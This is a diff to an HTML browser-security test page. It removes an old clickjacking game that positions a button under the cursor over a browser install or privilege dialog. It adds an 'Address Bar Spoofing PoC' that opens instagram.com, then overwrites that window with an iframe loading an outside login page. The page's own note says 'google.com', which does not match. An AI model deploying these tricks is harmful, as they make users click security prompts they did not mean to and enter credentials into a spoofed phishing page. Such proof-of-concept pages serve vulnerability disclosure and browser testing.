@@ -1,145 +1,47 @@
+<!DOCTYPE html>
 <html>
 <head>
-<script>
-var count = 0;
-var dcTimer = null;
-var nukeRadius = 10;
-
-function e()
-{
-  if (dcTimer == null)
-  {
-    dcTimer = setTimeout(noDoubleClick, 300);
-    if(count == 2)
-    {
-      try
-      {
-        netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
-        alert(Components.classes)
-        // InstallTrigger.startSoftwareUpdate('http://www.mozilla.org/404.xpi');
-      }
-      catch (er) { alert(er); }
-    }
-    start = (new Date()).getTime();
-
-    init(); 
-    
-  }
-  else
-  {
-    clearTimeout(dcTimer);
-    dcTimer = null;
-    ++count;
-
-    end = (new Date()).getTime();
-    time = end - start;
-
-    nuke.innerHTML = "";
-
-    nukeRadius = Math.round(1 / Math.pow((end - start) / 1000, 2));
-    if (nukeRadius > 300) nukeRadius = 300; // avoid causing mozilla to crash
-    setNuke();
-
-    var stockPrice = (50 - nukeRadius / 2);
-
-    var tryAgain = "Undamaged, <strong>click faster</strong>!"
-    var youWin = "Undamaged but <strong class=w>foreclosed</strong>";
-    setResults(time + "ms", nukeRadius + "px", (stockPrice>0 ? tryAgain : youWin), "$" + stockPrice);
-  }
-}
-
-function noDoubleClick()
-{
-  dcTimer = null;
-  setResults();
-  resetNuke();
-}
-
-function resetNuke()
-{
-  nukeRadius = 10;
-  nuke.innerHTML = "<nobr>&nbsp;&nbsp;&nbsp;&lt;-- double-click on the big red button</nobr>"
-  setNuke();
-}
-
-function setResults(a,b,c,d)
-{
-    results = document.getElementById("results");
-    results.rows[0].cells[1].innerHTML = a ? a : "You call that a double-click?";
-    results.rows[1].cells[1].innerHTML = b ? b : "Dud";
-    results.rows[2].cells[1].innerHTML = c ? c : "Undamaged";
-    results.rows[3].cells[1].innerHTML = d ? d : "$50";
-}
-
-
-
-function mousemove(e)
-{
-  // Example of location of security dialog for a maximized window:
-  // Client: (473, 306)                  <-- CSS is relative to this
-  // Screen: (477, 420)  (horiz, vert)   <-- Dialog appears relative to this
-
-// This is what I have to work with:
-// innerWidth innerHeight outerWidth outerHeight screenX screenY
-// e.screenX e.screenY  e.clientX e.clientY
-
-// We want to find out where the *center of the window* is relative to the *top-left of the document*.
-
-  gzTop = window.outerHeight / 2 - (e.screenY - window.screenY - e.clientY) + 50;
-  gzLeft = window.outerWidth / 2 - (e.screenX - window.screenX - e.clientX) - 40;
-
-  setNuke();
-  nuke.style.display = "block";
-}
-
-function setNuke()
-{
-  // This puts the top-left corner of nuke right at the center of the install button
-  nuke.style.left = gzLeft - nukeRadius/2;
-  nuke.style.top = gzTop - nukeRadius/2;
-
-  nuke.style.position = "absolute";
-  nuke.style.cursor = "crosshair";
-  nuke.style.width = nukeRadius;
-  nuke.style.height = nukeRadius;
-  nuke.style.MozBorderRadius=1000;
-}
-
-function init()
-{
-  if (document.addEventListener)
-    document.addEventListener("mousemove", mousemove, false);
-
-  nuke = document.getElementById("nuke");
-  resetNuke();
-}
-</script>
-
+<meta charset="UTF-8">
+<title>Address Bar Spoofing PoC</title>
 <style>
-h1,h2 { text-align: center; }
-strong { color: red; }
-strong.w { color : green; }
+body { font-family: Arial; text-align:center; margin-top:80px; }
+iframe { width:90%; height:80vh; border:1px solid #ccc; }
+.note { color:red; font-size:13px; margin-bottom:10px; }
 </style>
 
+<script>
+function go() {
+    // Open trusted origin
+   var win = window.open('https://www.instagram.com:90');
+
+    if (!win) {
+        alert("Popup blocked");
+        return;
+    }
+
+    setTimeout(function () {
+        try {
+            // Replace document with attacker content (iframe only)
+            win.document.open();
+            win.document.write(`
+                <p class="note">
+                    Demo: Address bar shows google.com, but content below is attacker-controlled.
+                </p>
+
+                <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
+            `);
+            win.document.close();
+
+        } catch (e) {
+            console.log("Blocked:", e);
+        }
+    }, 3000);
+}
+</script>
 </head>
 
-<body onload="init()">
-
-<h1>Nuke Microsoft</h1>
-<h2>The faster you double-click, the larger the explosion.</h2>
-
-<div id=nuke onclick="e()" onmouseout="resetNuke()" style="background-color: red; display: none;"></div>
-
-<div style="bottom:0; height: auto; top:auto; left:auto; right:auto; width: auto; position: absolute;">
-<h2>Nuke-o-meter</h2>
-
-<table id="results" border=1 align=center>
-<tr><td>Double-click speed:</td><td></td></tr>
-<tr><td>Blast radius:</td><td></td></tr>
-<tr><td>Status of the Gates Bunker:</td><td>Undamaged</td></tr>
-<tr><td>Microsoft stock price:</td><td>$50</td></tr>
-</table>
-</div>
-
+<body>
+<h2>Firefox iOS Address Bar Spoofing Test</h2>
+<button onclick="go()">Start Test</button>
 </body>
 </html>
